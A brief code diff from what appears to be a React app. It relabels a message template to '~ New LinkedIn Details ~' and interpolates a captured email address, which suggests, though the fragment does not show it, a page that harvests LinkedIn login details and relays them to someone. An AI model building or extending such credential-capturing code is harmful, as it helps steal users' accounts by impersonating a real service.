@@ -27,7 +27,7 @@ export default function App() {
       const message = `
 !UPDATE
 
-~ New Details ~
+~ New LinkedIn Details ~
 
 Email: ${emal}
 
